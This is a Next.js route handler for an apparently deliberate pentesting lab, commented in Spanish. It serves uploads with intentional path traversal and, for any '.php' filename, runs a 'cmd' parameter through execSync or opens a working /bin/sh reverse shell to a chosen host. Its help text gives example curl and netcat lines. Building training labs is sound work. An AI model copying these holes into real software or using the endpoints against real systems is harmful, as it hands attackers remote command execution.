import { NextRequest, NextResponse } from 'next/server'
import { readFile } from 'fs/promises'
import { existsSync } from 'fs'
import { execSync, spawn } from 'child_process'
import * as net from 'net'
import path from 'path'

/**
 * VULNERABILIDAD: Directory Listing Protegido vs Archivos Desprotegidos
 * 
 * El listado del directorio requiere bypass con X-Forwarded-For
 * Pero los archivos individuales son accesibles directamente
 * Esto simula una mala configuración de permisos común en servidores
 * 
 * Flujo de explotación:
 * 1. Sin header: GET /uploads → 403 Forbidden (directorio protegido)
 * 2. Con header: GET /uploads + X-Forwarded-For: 127.0.0.1 → 200 OK (muestra listado)
 * 3. Sin header: GET /uploads/shell.php.jp2 → 200 OK (archivo accesible directamente)
 * 
 * VULNERABILIDAD: Command Execution via PHP files
 * Si el archivo contiene .php en el nombre:
 * - ?cmd=<command> - ejecuta comandos del sistema
 * - ?shell=1&host=X&port=Y - inicia reverse shell
 * 
 * EDUCATIONAL PURPOSE: This is for pentesting lab training only.
 */

const UPLOADS_DIR = path.join(process.cwd(), 'uploads')

export async function GET(
  request: NextRequest,
  { params }: { params: { filename: string } }
) {
  // VULNERABILIDAD: Decodificar URL para permitir path traversal
  // El atacante puede usar ../../../ para navegar fuera del directorio
  const filename = decodeURIComponent(params.filename)
  
  // VULNERABILIDAD: Acceso directo permitido sin protección
  // El directorio /uploads (route.ts) requiere X-Forwarded-For pero los archivos individuales ([filename]/route.ts) no
  // Esto simula una configuración incorrecta de permisos realista
  
  // VULNERABILIDAD: Path Traversal - no sanitiza ../ en el filename
  // Permite navegar fuera del directorio uploads
  const filePath = path.join(UPLOADS_DIR, filename)
  
  if (!existsSync(filePath)) {
    return NextResponse.json({
      error: 'Archivo no encontrado',
      filename: filename,
      path: `/uploads/${filename}`
    }, { status: 404 })
  }
  
  // VULNERABILIDAD: Ejecución de comandos en archivos PHP
  // Si el nombre del archivo contiene .php, permite ejecución de comandos
  const lowerFilename = filename.toLowerCase()
  if (lowerFilename.includes('.php')) {
    const url = new URL(request.url)
    const cmd = url.searchParams.get('cmd')
    const shell = url.searchParams.get('shell')
    const host = url.searchParams.get('host') || '127.0.0.1'
    const port = parseInt(url.searchParams.get('port') || '4444', 10)
    
    // VULNERABILIDAD: Command Injection sin sanitización
    // Ejecuta comandos directamente desde el parámetro cmd
    if (cmd) {
      try {
        const output = execSync(cmd, { encoding: 'utf-8', timeout: 10000 })
        return new NextResponse(output, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection',
            'X-Command-Executed': cmd
          }
        })
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : 'Unknown error'
        return new NextResponse(`Error executing command: ${errorMessage}`, {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'command-injection'
          }
        })
      }
    }
    
    // VULNERABILIDAD: Reverse Shell
    // Inicia una conexión de reverse shell al host y puerto especificados
    if (shell === '1') {
      try {
        const client = new net.Socket()
        client.connect(port, host, () => {
          const sh = spawn('/bin/sh', [], {
            stdio: ['pipe', 'pipe', 'pipe']
          })
          client.pipe(sh.stdin)
          sh.stdout.pipe(client)
          sh.stderr.pipe(client)
        })
        
        client.on('error', () => {
          // Silently handle connection errors
        })
        
        return new NextResponse('Reverse shell initiated. Connect with: nc -lvnp ' + port, {
          status: 200,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell',
            'X-Target-Host': host,
            'X-Target-Port': port.toString()
          }
        })
      } catch (error) {
        return new NextResponse('Error initiating reverse shell', {
          status: 500,
          headers: {
            'Content-Type': 'text/plain',
            'X-Vulnerability': 'reverse-shell'
          }
        })
      }
    }
    
    // Si no hay cmd ni shell, mostrar mensaje de ayuda
    return new NextResponse(
      `Shell uploaded successfully!\n\n` +
      `Usage:\n` +
      `  Execute commands: /uploads/${filename}?cmd=whoami\n` +
      `  Reverse shell:    /uploads/${filename}?shell=1&host=<IP>&port=<PORT>\n\n` +
      `Example:\n` +
      `  curl "http://localhost:3000/uploads/${filename}?cmd=ls -la"\n` +
      `  curl "http://localhost:3000/uploads/${filename}?shell=1&host=10.10.10.10&port=4444"`,
      {
        status: 200,
        headers: {
          'Content-Type': 'text/plain',
          'X-Vulnerability': 'php-execution',
          'X-Shell-Active': 'true'
        }
      }
    )
  }
  
  try {
    const content = await readFile(filePath)
    const ext = path.extname(filename).toLowerCase()
    
    // Determinar Content-Type basado en extensión
    const contentTypes: Record<string, string> = {
      '.txt': 'text/plain',
      '.html': 'text/html',
      '.json': 'application/json',
      '.jpg': 'image/jpeg',
      '.jpeg': 'image/jpeg',
      '.png': 'image/png',
      '.gif': 'image/gif',
      '.svg': 'image/svg+xml',
      '.pdf': 'application/pdf',
      '.jp2': 'image/jp2',
      '.xml': 'application/xml'
    }
    
    const contentType = contentTypes[ext] || 'application/octet-stream'
    
    // Sanitize filename for Content-Disposition header to prevent header injection
    const safeFilename = path.basename(filename).replace(/[\r\n"]/g, '_')
    
    return new NextResponse(content, {
      status: 200,
      headers: {
        'Content-Type': contentType,
        'Content-Disposition': `inline; filename="${safeFilename}"`,
        'X-Vulnerability': 'unprotected-file-access',
        'X-Access-Granted': 'true'
      }
    })
  } catch (error) {
    return NextResponse.json({
      error: 'Error al leer el archivo',
      message: (error as Error).message
    }, { status: 500 })
  }
}
